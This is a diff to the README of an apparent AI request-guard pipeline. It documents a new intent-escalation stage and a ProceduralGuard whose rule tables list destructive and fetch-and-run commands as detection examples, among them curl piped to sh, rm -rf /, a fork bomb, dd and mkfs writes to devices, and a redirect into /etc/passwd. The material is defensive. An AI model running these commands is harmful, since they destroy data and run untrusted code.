@@ -25,7 +25,68 @@ Every stage in the pipeline is wrapped in a try/except. Any exception returns:
 {"allowed": false, "reason": "fail_closed:<stage>"}
 ```
 
-Stages: `parser`, `execution_gate`, `capability_gate`, `jailbreak_guard`, `procedural_guard`, `constitution`, `risk_aggregator`, `confirmation_gate`, `policy_engine`, `output_gate`.
+Stages: `parser`, `intent_escalation`, `execution_gate`, `capability_gate`, `jailbreak_guard`, `procedural_guard`, `constitution`, `risk_aggregator`, `confirmation_gate`, `policy_engine`, `output_gate`.
+
+---
+
+## Intent Escalation
+
+`ExecutionGate` and `CapabilityGate` only evaluate requests whose intent is
+`operate`, which made the guard chain depend on the parser correctly recognising
+a command. The escalation stage removes that coupling by re-deriving operative
+intent from the raw input, independent of the parser's verb list.
+
+**Signals** (any one escalates):
+
+| Signal | Example |
+|--------|---------|
+| `procedural_command_detected` | any `ProceduralGuard` hit |
+| `command_substitution` | `` echo $(whoami) ``, `` `id` `` |
+| `pipe_to_shell` | `curl https://x \| sh` |
+| `redirect_to_path` | `report > /etc/passwd` |
+| `binary_with_arguments` | `systemctl --now disable nginx` |
+| `device_operand` | `if=/dev/zero`, `of=/dev/sda` |
+| `privilege_escalation` | `sudo reboot` |
+
+**Monotonicity:** the stage only raises `ask`/`consultive` to
+`operate`/`operative`. It can never relax a request, so it cannot itself be
+used as a bypass. Escalations are recorded in the audit context under
+`intent_escalation`. Disable via `intent_escalation.enabled: false`.
+
+---
+
+## ProceduralGuard
+
+Detects irreversible or privileged system operations. Matching runs over the
+same normalized form as the JailbreakGuard (see below), so invisible-character
+and diacritic obfuscation cannot split a command token.
+
+Rules are **governed by `policy.yaml`**: each entry in
+`procedural_guard.critical_tags` activates a rule family. Legacy literals expand
+to flag-order-tolerant, argument-anchored patterns; unrecognised entries degrade
+to literal substring matching so custom operator rules keep working.
+
+| Config key | Covers | Risk |
+|-----------|--------|------|
+| `rm -rf /` | root recursive delete — `-rf`, `-fr`, `-r -f`, `--recursive --force`, `--no-preserve-root`, and top-level system paths (`/etc`, `/usr`, `/var`, …) | 100 (hard-deny) |
+| `mkfs` | filesystem format — **requires a `/dev/` argument** | 100 (hard-deny) |
+| `:(){:\|:&};:` | fork bomb, tolerant to spacing | 100 (hard-deny) |
+| `block_device_write` | `dd of=/dev/sdX`, `> /dev/sdX`, `shred`/`wipefs` on a device | 100 (hard-deny) |
+| `recursive_force_delete` | `rm -rf` on a **non-root** path | 55 (confirm) |
+| `remote_code_execution` | `curl`/`wget` piped into a shell | 70 |
+
+**Severity tiering matters.** `critical_tag_detected` is a hard-deny tag, so it
+is reserved for irreversible destruction. `rm -rf /tmp/build` is dangerous but
+recoverable: hard-denying it would make the engine unusable, so it lands in the
+confirmation band instead.
+
+**Discussion is not execution.** Rules are anchored on command arguments, so
+`explain what mkfs does` and `What does rm -rf do?` do not fire — the first has
+no device argument, the second no path target.
+
+**Multi-match behavior:** all matching rules are collected. Score, confidence
+and reason come from the highest-severity match; the tag list is the de-duplicated
+union across every match.
 
 ---
 
